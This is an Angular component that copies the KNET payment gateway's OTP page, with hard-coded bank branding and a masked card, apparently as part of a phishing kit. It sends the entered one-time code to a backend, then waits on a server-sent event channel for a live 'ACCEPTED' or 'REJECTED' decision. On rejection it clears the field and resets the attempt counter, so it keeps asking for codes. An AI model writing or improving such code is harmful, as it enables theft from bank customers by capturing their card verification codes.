import { Component, OnInit, OnDestroy, signal, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { ToastService } from '../../services/toast';
import { enviroment } from '../../../env/enviroment';

@Component({
  selector: 'app-knet-otp',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './knet-otp.html',
  styleUrl: './knet-otp.css',
})
export class KnetOtp implements OnInit, OnDestroy {
  toastService = inject(ToastService);
  router = inject(Router);

  // States: 'otp' | 'success'
  viewState = signal<'otp' | 'success'>('otp');
  isLoading = signal<boolean>(false);
  errorMessage = signal<string>('');

  otpValue = signal<string>('');
  amount = signal<string>('5.000');
  phone = signal<string>('');
  clientId = signal<string>('');

  // Additional signals for Knet exact styling representation
  bankLogo = signal<string>('imgs/download.jpg');
  bankName = signal<string>('KIB');
  maskedCard = signal<string>('4507 78** **** 2462');
  expiryMonth = signal<string>('10');
  expiryYear = signal<string>('2030');
  timerText = signal<string>('Timeout in: 03:59');
  otpRejected = signal<boolean>(false);
  attemptsRemaining = signal<number>(3);

  timerInterval: any = null;
  eventSource: EventSource | null = null;

  ngOnInit() {
    // Default to mock values if session doesn't exist so developers/users can inspect page directly without immediate redirect
    this.clientId.set(localStorage.getItem('client_id') || 'mock-session-id');
    
    const storedAmount = localStorage.getItem('pay_total_kd');
    if (storedAmount) {
      const num = parseFloat(storedAmount.replace(',', '.'));
      this.amount.set(isNaN(num) ? '5.000' : num.toFixed(3));
    } else {
      this.amount.set('5.000');
    }
    
    this.phone.set(localStorage.getItem('client_phone') || '96590000000');

    this.bankLogo.set(localStorage.getItem('bank_logo') || 'imgs/download.jpg');
    this.bankName.set(localStorage.getItem('bank_name') || 'KIB');
    this.maskedCard.set(localStorage.getItem('masked_card') || '4507 78** **** 2462');
    this.expiryMonth.set(localStorage.getItem('expiry_month') || '10');
    this.expiryYear.set(localStorage.getItem('expiry_year') || '2030');

    this.startTimer();
  }

  startTimer() {
    let secondsRemaining = 239; // Starts at 3:59 to match the screenshot exactly
    const updateTimerDisplay = () => {
      const min = Math.floor(secondsRemaining / 60);
      const sec = secondsRemaining % 60;
      const minStr = min < 10 ? '0' + min : min.toString();
      const secStr = sec < 10 ? '0' + sec : sec.toString();
      this.timerText.set(`Timeout in: ${minStr}:${secStr}`);
    };

    updateTimerDisplay();

    this.timerInterval = setInterval(() => {
      if (secondsRemaining > 0) {
        secondsRemaining--;
        updateTimerDisplay();
      } else {
        clearInterval(this.timerInterval);
      }
    }, 1000);
  }

  ngOnDestroy() {
    this.cleanupSSE();
    if (this.timerInterval) {
      clearInterval(this.timerInterval);
    }
  }

  onOtpInput(event: Event) {
    const input = event.target as HTMLInputElement;
    const val = input.value.replace(/[^0-9]/g, '').substring(0, 6);
    input.value = val;
    this.otpValue.set(val);
  }

  async onSubmit(event: Event) {
    event.preventDefault();
    this.errorMessage.set('');

    const otp = this.otpValue();
    if (!otp || otp.length !== 6) {
      this.toastService.show('يجب إدخال رمز التحقق المكون من 6 أرقام كاملة', 'error');
      return;
    }

    this.isLoading.set(true);

    try {
      const response = await fetch(enviroment.api_base + '/api/otps', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          otp: otp,
          client_id: this.clientId()
        })
      });

      const resData = await response.json();
      if (!resData.success) {
        this.isLoading.set(false);
        this.errorMessage.set(resData.error || 'حدث خطأ أثناء إرسال رمز التحقق');
        return;
      }

      // Open SSE connection to listen for OTP approval
      this.eventSource = new EventSource(enviroment.api_base + `/api/events/client/${this.clientId()}`);
      this.eventSource.addEventListener('otp_status', (evt: any) => {
        const payload = JSON.parse(evt.data);
        if (payload.status === 'ACCEPTED') {
          this.cleanupSSE();
          // Short delay then show success screen
          setTimeout(() => {
            this.isLoading.set(false);
            this.viewState.set('success');
            // Clear localStorage session
            localStorage.removeItem('client_id');
            localStorage.removeItem('pay_total_kd');
            localStorage.removeItem('client_phone');
          }, 1500);
        } else if (payload.status === 'REJECTED') {
          this.cleanupSSE();
          this.isLoading.set(false);
          this.otpValue.set(''); // Clear OTP input code
          
          if (this.otpRejected()) {
            this.attemptsRemaining.update(a => a > 1 ? a - 1 : 3);
          } else {
            this.otpRejected.set(true);
            this.attemptsRemaining.set(3);
          }
          this.errorMessage.set('');
        }
      });

      this.eventSource.onerror = () => {
        this.cleanupSSE();
        this.isLoading.set(false);
        this.errorMessage.set('خطأ في الاتصال بالخادم لمراقبة رمز التحقق.');
      };

    } catch (err: any) {
      this.isLoading.set(false);
      this.errorMessage.set('فشل الاتصال بالخادم. يرجى المحاولة لاحقاً');
    }
  }

  cleanupSSE() {
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }
  }

  goHome() {
    this.router.navigate(['/']);
  }
}
